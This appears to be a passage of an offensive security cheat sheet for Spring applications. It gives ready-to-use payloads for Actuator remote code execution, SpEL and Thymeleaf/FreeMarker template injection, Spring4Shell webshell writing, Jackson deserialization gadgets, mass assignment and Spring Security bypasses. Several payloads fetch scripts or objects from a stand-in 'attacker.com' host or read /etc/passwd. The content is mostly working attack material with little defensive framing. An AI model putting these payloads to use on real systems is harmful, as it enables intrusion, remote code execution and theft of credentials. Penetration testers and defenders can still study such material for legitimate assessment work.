<sensitive_endpoints>
{% raw %}
# High-value Actuator endpoints:

# /actuator/env - Environment variables and properties
# May expose:
# - Database credentials
# - API keys
# - Secrets
# Properties masked as ****** but sometimes exposed

# /actuator/heapdump - JVM heap dump
# Contains:
# - Passwords in memory
# - Session tokens
# - Encryption keys
# Download and analyze with tools like VisualVM

# /actuator/configprops - Configuration properties
# Full configuration including sensitive values

# /actuator/mappings - All URL mappings
# Complete route enumeration

# /actuator/beans - All Spring beans
# Internal application structure

# /actuator/trace or /actuator/httptrace - HTTP request traces
# May contain auth tokens, cookies
{% endraw %}
</sensitive_endpoints>

<actuator_exploitation>
{% raw %}
# Actuator RCE vectors:

# 1. /actuator/env + /actuator/restart
# Set properties via POST, restart to apply
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"spring.datasource.url","value":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'"}

POST /actuator/restart

# 2. /actuator/jolokia - JMX over HTTP
# Execute MBeans operations
POST /actuator/jolokia
Content-Type: application/json

{
  "type": "exec",
  "mbean": "com.sun.management:type=DiagnosticCommand",
  "operation": "compilerDirectivesAdd",
  "arguments": ["http://attacker.com/evil.txt"]
}

# 3. /actuator/gateway/routes (Spring Cloud Gateway)
# Add malicious routes
POST /actuator/gateway/routes/evil HTTP/1.1
Content-Type: application/json

{
  "id": "evil",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/evil/**"}}],
  "filters": [{"name": "RewritePath", "args": {"_genkey_0": "/evil/(?<path>.*)", "_genkey_1": "/${path}"}}],
  "uri": "http://attacker.com"
}

POST /actuator/gateway/refresh
{% endraw %}
</actuator_exploitation>
</actuator_endpoints>

<spel_injection>
<injection_points>
{% raw %}
# SpEL injection locations:

# 1. @Value annotation with user input
@Value("#{${userInput}}")

# 2. Message expressions (Thymeleaf)
${__${userInput}__}

# 3. Spring Security expressions
@PreAuthorize("#{userInput}")

# 4. Query parameters in SpEL
@Query("SELECT * FROM users WHERE #{#condition}")

# 5. Error messages with SpEL
{% endraw %}
</injection_points>

<spel_payloads>
{% raw %}
# SpEL RCE payloads:

# Basic command execution
${T(java.lang.Runtime).getRuntime().exec('id')}

# ProcessBuilder
${T(java.lang.ProcessBuilder).new({'cat','/etc/passwd'}).start()}

# ScriptEngine
${T(javax.script.ScriptEngineManager).new().getEngineByName('nashorn').eval('java.lang.Runtime.getRuntime().exec("id")')}

# Full payload with output:
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}

# URL-encoded for GET parameters:
%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D

# Thymeleaf SpEL injection:
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
{% endraw %}
</spel_payloads>

<blind_spel>
{% raw %}
# Blind SpEL injection:

# Time-based:
${T(java.lang.Thread).sleep(5000)}

# DNS-based:
${T(java.net.InetAddress).getByName('attacker.com')}

# HTTP-based:
${T(java.net.URL).new('http://attacker.com').openConnection().getResponseCode()}
{% endraw %}
</blind_spel>
</spel_injection>

<mass_assignment>
<data_binding_abuse>
{% raw %}
# Spring MVC data binding vulnerabilities:

# Vulnerable controller:
@PostMapping("/user")
public String updateUser(@ModelAttribute User user) {...}

# Attack - bind unexpected fields:
POST /user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=attacker&role=admin&isAdmin=true&password=newpass

# Nested object binding:
POST /user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

profile.settings.admin=true&profile.permissions[0]=ALL
{% endraw %}
</data_binding_abuse>

<class_loader_manipulation>
{% raw %}
# CVE-2022-22965 (Spring4Shell) style attacks:

# Manipulate class loader through data binding:
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7bc2%7di...

# Target Tomcat AccessLogValve:
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

# Requires specific conditions:
# - JDK 9+
# - WAR deployment
# - Specific Tomcat version
{% endraw %}
</class_loader_manipulation>

<jackson_binding>
{% raw %}
# Jackson deserialization via data binding:

# If @JsonTypeInfo used with untrusted input:
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/evil",
  "autoCommit": true
}

# Or property-based:
{
  "type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/evil"
}
{% endraw %}
</jackson_binding>
</mass_assignment>

<template_injection>
<thymeleaf_ssti>
{% raw %}
# Thymeleaf Server-Side Template Injection:

# Standard SpEL in Thymeleaf:
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# Fragment expression:
~{::__${T(java.lang.Runtime).getRuntime().exec('id')}__}

# In URL/path:
/path?name=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# Preprocessing:
/doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x.pdf

# If return value used in template:
@GetMapping("/{doc}")
public String getDoc(@PathVariable String doc, Model model) {
    return doc;  // SSTI if doc is template path
}
{% endraw %}
</thymeleaf_ssti>

<freemarker_ssti>
{% raw %}
# FreeMarker template injection:

# Execute method:
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}

# ObjectConstructor:
<#assign oc = "freemarker.template.utility.ObjectConstructor"?new()>
${oc("java.lang.ProcessBuilder", ["id"]).start()}

# JythonRuntime (if available):
<#assign jr = "freemarker.template.utility.JythonRuntime"?new()>
{% endraw %}
</freemarker_ssti>
</template_injection>

<spring_security>
<security_bypass>
{% raw %}
# Spring Security filter bypass:

# Path normalization differences:
/admin/../user  # May bypass /admin/** rules
/admin/;x=y     # Semicolon in path
/admin%2f..%2fuser
/Admin          # Case sensitivity

# Method-based bypass:
# If only GET is secured:
POST /admin HTTP/1.1  # Different method
OPTIONS /admin HTTP/1.1

# Content-type bypass:
# If security only checks certain content types
Content-Type: application/xml  # Instead of JSON
{% endraw %}
</security_bypass>

<authentication_bypass>
{% raw %}
# Authentication vulnerabilities:

# Remember-me token manipulation:
# If using default remember-me
remember-me: username:expiry:signature

# JWT issues (if using Spring Security JWT):
# Algorithm confusion
# Token validation bypass

# OAuth2 misconfigurations:
# Redirect URI manipulation
# State parameter issues
{% endraw %}
</authentication_bypass>

<authorization_bypass>
{% raw %}
# @PreAuthorize and @PostAuthorize bypass:

# SpEL in security expressions:
@PreAuthorize("hasRole(#role)")  # If role parameter controlled

# Missing authorization:
# Endpoints without security annotations

# CORS + CSRF bypass:
# Cross-origin requests with credentials
{% endraw %}
</authorization_bypass>
</spring_security>

